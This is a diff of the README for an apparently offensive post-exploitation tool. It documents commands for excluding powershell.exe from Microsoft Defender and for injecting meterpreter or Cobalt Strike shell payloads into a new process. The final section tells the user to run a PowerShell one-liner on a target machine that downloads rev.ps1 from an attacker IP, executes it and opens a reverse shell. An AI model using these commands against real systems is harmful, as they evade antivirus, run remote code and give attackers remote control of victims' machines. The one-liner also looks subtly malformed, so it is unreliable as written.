@@ -63,9 +63,21 @@ amsi-bypass
 
 ### exclude
 
-The exlucde functionality
+The exlucde functionality will try to exclude powershell.exe from defender, admin permission are needed.
+
+```
+exclude
+```
 
 ### payload
+
+The payload functionality will try to create a new process and inject the shell payload can be meterpreter or cobalt strike...\
+The paylaod must be a cs file.
+
+```
+payload <payload.cs>
+```
+
 ### socks-start
 ### socks-stop
 ### socks
@@ -78,5 +90,5 @@ Rev.ps1 is the powershell script to connect back to us.\
 To start the reverse shell run the following code on the target machine.
 
 ```
-(New-Object System.Net.WebClient).DownloadString('http://<IP>/rev.ps1') IEX; Send-Shell -i <IP> -p 9001
+(New-Object System.Net.WebClient).DownloadString('http://<IP>/rev.ps1') IEX; Send-Shell -i <IP> -p <ShellPort>
 ```
